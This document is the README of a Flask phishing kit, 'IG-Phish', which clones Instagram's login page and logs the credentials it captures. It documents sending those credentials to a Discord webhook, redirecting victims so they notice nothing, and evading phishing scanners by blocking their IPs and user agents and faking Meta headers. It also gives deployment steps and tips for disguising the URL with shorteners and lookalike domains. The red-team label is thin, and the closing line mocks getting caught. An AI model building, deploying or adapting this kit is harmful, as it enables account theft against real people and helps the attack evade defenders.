╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██╗ ██████╗      ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗           ║
║   ██║██╔════╝      ██╔══██╗██║  ██║██║██╔════╝██║  ██║           ║
║   ██║██║  ███╗     ██████╔╝███████║██║███████╗███████║           ║
║   ██║██║   ██║     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║           ║
║   ██║╚██████╔╝     ██║     ██║  ██║██║███████║██║  ██║           ║
║   ╚═╝ ╚═════╝      ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝           ║
║                                                                   ║
║           ⚡ 2024 UI Fixed Edition ⚡                               ║
║        Credential Harvesting Framework                            ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝


<br>

![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Flask](https://img.shields.io/badge/Flask-2.x-000000?style=for-the-badge&logo=flask&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge)
![Railway](https://img.shields.io/badge/Deploy-Railway-0B0D0E?style=for-the-badge&logo=railway&logoColor=white)

*Deploy. Send. Collect. Repeat.*

</div>

---

## 📖 Table of Contents

- [What Is This](#-what-is-this)
- [Features](#-features)
- [Architecture](#-architecture)
- [Quick Start](#-quick-start)
- [Configuration](#-configuration)
- [File Structure](#-file-structure)
- [Anti-Detection Systems](#-anti-detection-systems)
- [Discord Exfiltration](#-discord-exfiltration)
- [Admin Panel](#-admin-panel)
- [Deployment](#-deployment)
- [API Reference](#-api-reference)
- [Troubleshooting](#-troubleshooting)
- [Contributing](#-contributing)
- [License](#-license)

---

## 🎯 What Is This

IG-Phish is a Flask-based credential harvesting framework that serves a pixel-perfect replica of Instagram\'s 2024 login interface. When a target enters their credentials, the framework captures, logs, and exfiltrates them in real-time via Discord webhook — then seamlessly redirects the target to the legitimate Instagram login page so they suspect nothing.

Built for red team operators, security researchers, and authorized penetration testers who need to demonstrate the effectiveness of social engineering attacks.

---

## ✨ Features

### Core Harvesting
- **Credential Capture** — Username/password intercepted before form submission
- **Session Fingerprinting** — SHA-256 hash of IP + UA + language + screen resolution + timezone
- **Geo-IP Lookup** — Automatic country/city resolution via ipapi.co
- **Quality Scoring** — Differentiates between email+full recon targets vs username-only

### Anti-Detection
- **Scanner Blocking** — IP prefix and User-Agent pattern matching against 25+ known security scanners
- **Honeypot Paths** — 8 fake paths (`/wp-admin`, `/.env`, `/.git/config`, etc.) that redirect scanners to the real Instagram
- **Stealth Headers** — Mimics Meta\'s production server response headers
- **Robots/Sitemap** — Serves convincing `robots.txt` and `sitemap.xml`
- **Favicon Proxy** — Redirects to Instagram\'s actual favicon
- **Security.txt** — Serves `security@instagram.com` contact to appear legitimate

### Exfiltration
- **Discord Webhook** — Rich embed notifications for both credential captures and page visits
- **Color-Coded Quality** — Green for email targets, blue for timezone-recon complete, standard for username-only
- **Visit Alerts** — Know when someone loads the page, even if they don\'t submit

### Infrastructure
- **Railway-Ready** — Auto-detects Railway environment, switches data directories
- **Persistent Storage** — JSON-based credential log with append-only writes
- **Admin Dashboard** — Web-based credential viewer with one-click clear
- **Environment Config** — All secrets in `.env`, never hardcoded

---

## 🏗️ Architecture

```
┌─────────────┐     ┌──────────────────┐     ┌─────────────┐
│   Target     │────▶│   Flask Server    │────▶│   Discord   │
│   Browser    │     │                  │     │   Webhook   │
└─────────────┘     │  ┌────────────┐  │     └─────────────┘
                    │  │ AntiDetect │  │
                    │  │ Middleware  │  │     ┌─────────────┐
                    │  └────────────┘  │────▶│   JSON Log  │
                    │                  │     │  (captured_  │
                    │  ┌────────────┐  │     │ credentials)│
                    │  │  Harvest   │  │     └─────────────┘
                    │  │  Engine    │  │
                    │  └────────────┘  │     ┌─────────────┐
                    │                  │────▶│  Admin Panel │
                    │  ┌────────────┐  │     │  /admin/creds│
                    │  │  Exfil     │  │     └─────────────┘
                    │  │  Module    │  │
                    │  └────────────┘  │
                    └──────────────────┘
```

**Request Flow:**

1. Target loads the page → `GET /`
2. Anti-detection middleware checks for scanners
3. If clean → serve `me.html` (Instagram clone) + log visit to Discord
4. Target submits credentials → `POST /auth/login`
5. Harvester captures username, password, fingerprint, IP, UA, screen res, timezone
6. Credential saved to JSON + sent to Discord webhook
7. Target redirected to real Instagram login (they think they mistyped)

---

## 🚀 Quick Start

### Prerequisites
- Python 3.9+
- pip

### Install & Run

```bash
# Clone the repo
git clone https://github.com/yourorg/ig-phish.git
cd ig-phish

# Install dependencies
pip install flask requests

# Create your .env file
cat > .env << EOF
ADMIN_KEY=your_secret_admin_key_here
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE
REDIRECT_URL=https://www.instagram.com/accounts/login/
EOF

# Run it
python app.py
```

Server starts on `http://0.0.0.0:5001` by default.

---

## ⚙️ Configuration

All configuration lives in your `.env` file. The framework loads it automatically.

| Variable | Required | Default | Description |
|---|---|---|---|
| `ADMIN_KEY` | Yes | `changeme_redteam` | Authentication key for admin panel access |
| `DISCORD_WEBHOOK_URL` | No | *(empty)* | Discord webhook for real-time credential/visit alerts |
| `REDIRECT_URL` | No | `https://www.instagram.com/accounts/login/` | Where targets get redirected after capture |
| `PORT` | No | `5001` | Server listening port |
| `RAILWAY_ENVIRONMENT` | Auto | *(empty)* | Auto-detected on Railway; don\'t set manually |

### Environment Detection

The framework auto-detects Railway deployment:

```python
IS_RAILWAY = os.environ.get("RAILWAY_ENVIRONMENT") is not None
DATA_DIR = "/data" if IS_RAILWAY else "./data"
```

On Railway, credential logs persist to `/data/captured_credentials.json`. Locally, they go to `./data/captured_credentials.json`.

---

## 📁 File Structure

```
ig-phish/
├── app.py                    # Main Flask application
├── me.html                   # Instagram 2024 login page clone
├── me_files/                 # Static assets for the login page
│   └── (CSS, JS, images)
├── Instagram_files/          # Additional Instagram static assets
│   └── (fonts, icons, sprites)
├── data/                     # Local credential storage (created at runtime)
│   └── captured_credentials.json
├── .env                      # Your configuration (NEVER commit this)
├── .gitignore
├── README.md                 # This file
├── CONTRIBUTING.md           # Contribution guidelines
└── LICENSE                   # MIT License
```

---

## 🛡️ Anti-Detection Systems

### Scanner IP Prefixes

The following IP ranges are associated with known security crawlers, PhishTank verifiers, and search engine bots. Requests from these IPs get 302\'d to real Instagram:

| Prefix | Entity |
|---|---|
| `66.249.`, `74.125.`, `216.239.` | Googlebot / Google crawlers |
| `185.220.101.` | Tor exit nodes (common with scanners) |
| `91.198.22.` | PhishTank |
| `194.163.131.` | URLQuery |
| `52.0.`, `54.0.`, `3.80.`, `3.90.`, `35.172.`, `44.224.` | AWS-based scanners |

### Scanner User-Agents

25+ patterns blocked including: `Googlebot`, `bingbot`, `VirusTotal`, `PhishTank`, `Netcraft`, `URLQuery`, `Quttera`, `Sucuri`, `AhrefsBot`, `SemrushBot`, `facebookexternalhit`, `LinkedInBot`, and more.

### Honeypot Paths

These paths are traps — any request to them triggers an immediate redirect:

```
/admin/login.php
/wp-admin
/.env
/api/v1/tokens
/.git/config
/backup.sql
/phpmyadmin
/config.yml
/server-status
```

### Stealth Headers

Every response includes headers that mimic Meta\'s production infrastructure:

```python
{
    "Server": "prodboltdog",
    "X-AC-Dep-Revision": "<random 9-digit number>",
    "X-Frame-Options": "SAMEORIGIN",
    "X-Content-Type-Options": "nosniff",
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    "Cache-Control": "private, no-cache, no-store, must-revalidate",
    "Vary": "Accept-Language, Accept-Encoding, Cookie, RUR",
}
```

---

## 📡 Discord Exfiltration

### Credential Capture Alert

When credentials are harvested, a rich embed is sent to your webhook:

- **Username/Password** — Displayed in code block for easy copy
- **IP Address** — For further reconnaissance
- **Timestamp** — Discord-formatted with relative time
- **User Agent** — First 100 chars for device identification
- **Screen Resolution** — Via `sr` parameter from the login form
- **Timezone** — Via `tz` parameter
- **Fingerprint** — 16-char SHA-256 truncation for unique visitor tracking
- **Data Quality** — 🟢 HIGH (email detected) or 🟡 MEDIUM (username only)

### Visit Alert

When someone loads the page (even without submitting):

- **Host/Path/Query** — Full request context
- **Referrer** — Where they came from
- **IP + Geo** — Country and city via ipapi.co
- **Language + UA** — Browser fingerprint data

### Color Coding

| Color | Hex | Meaning |
|---|---|---|
| 🟢 Green | `0x57F287` | Email address detected in username field |
| 🔵 Blue | `0x5865F2` | Timezone data captured (full recon) |
| 🩷 Pink | `0x0095F6` | Standard capture, username only |

---

## 🔐 Admin Panel

Access your harvested credentials at:

```
/admin/creds?key=YOUR_ADMIN_KEY
```

### Features
- Dark-themed monospace dashboard
- Sticky headers for easy scrolling
- Total capture count
- Reverse-chronological display (newest first)
- Columns: Time, Username, Password, IP, Fingerprint, Timezone

### Clear All Credentials

```
/admin/clear?key=YOUR_ADMIN_KEY
```

Removes the JSON log file and redirects back to the credential viewer.

---

## ☁️ Deployment

### Railway (Recommended)

1. Push this repo to GitHub
2. Connect Railway to your repo
3. Set environment variables in Railway dashboard:
   - `ADMIN_KEY`
   - `DISCORD_WEBHOOK_URL`
4. Deploy — Railway auto-detects Flask via `PORT` env var
5. Your phishing page lives at `https://your-app.up.railway.app`

Railway provides persistent `/data` storage, so credentials survive redeployments.

### Local / VPS

```bash
# With Gunicorn for production
pip install gunicorn
gunicorn app:app --bind 0.0.0.0:5001 --workers 2

# With nginx reverse proxy
# Point your domain\'s SSL to localhost:5001
```

### URL Masking Tips

- Use a URL shortener (Bitly, TinyURL) to mask the actual domain
- Subdomain spoofing: `login-instagram.yourdomain.com`
- QR codes for mobile targets
- Unicode lookalikes in domain names

---

## 📚 API Reference

### `GET /`
Serves the Instagram login page. Logs visit to Discord if webhook configured.

### `POST /auth/login`
Captures credentials from form submission.

**Form Data Expected:**
| Field | Description |
|---|---|
| `username` or `email` | Target\'s Instagram username or email |
| `password` or `pass` | Target\'s password |
| `sr` | Screen resolution (e.g., `1920x1080`) |
| `tz` | Timezone offset |

**Response:** 302 redirect to `REDIRECT_URL`

### `GET /accounts/login/`
Alias for `GET /` — matches Instagram\'s alternate login URL pattern.

### `GET /admin/creds?key=KEY`
View all captured credentials in browser.

### `GET /admin/clear?key=KEY`
Delete all stored credentials.

### `GET /health`
Returns `ok` with 200 status. Use for uptime monitoring.

### `GET /robots.txt`
Serves Instagram-legitimate robots.txt.

### `GET /sitemap.xml`
Serves minimal sitemap pointing to instagram.com.

### `GET /favicon.ico`
302 redirect to Instagram\'s actual favicon.

### `GET /.well-known/security.txt`
Serves `security@instagram.com` contact — further legitimacy.

### Static Asset Routes
- `/Instagram_files/<filename>` — Serves from `Instagram_files/` directory
- `/me_files/<filename>` — Serves from `me_files/` directory

---

## 🔧 Troubleshooting

| Problem | Solution |
|---|---|
| Template load error | Ensure `me.html` exists in the same directory as `app.py` |
| Discord not receiving | Verify webhook URL, check channel permissions, test webhook in browser |
| Credentials not saving | Check `data/` directory permissions, ensure write access |
| Scanner false positives | Adjust `SCANNER_IP_PREFIXES` and `SCANNER_UAS` lists in `app.py` |
| Login button appears locked | The CSS override in `me.html` forces the button visible — if still locked, check that the CSS block is present in the `<head>` |
| Railway data loss | Ensure you\'re writing to `/data`, not local `./data` (auto-handled by `IS_RAILWAY` detection) |

---

## 🤝 Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.

**TL;DR:**
- Fork → Branch → Commit → PR
- Match existing code style
- Test locally before submitting
- Keep anti-detection signatures updated

---

## 📄 License

See [LICENSE](LICENSE) — MIT. Use it. Break it. Improve it. Just don\'t be a jerk.

---

<div align="center">

**⚡ Built for red teamers, by red teamers. ⚡**

```
    ╦ ╦╔═╗╦ ╦╔═╗╦═╗╔╦╗
    ║║║║ ║╚╦╝║╣ ╠╦╝ ║ 
    ╚╩╝╚═╝ ╩ ╚═╝╩╚═ ╩ 
```

*If you\'re caught, you weren\'t good enough.*

</div>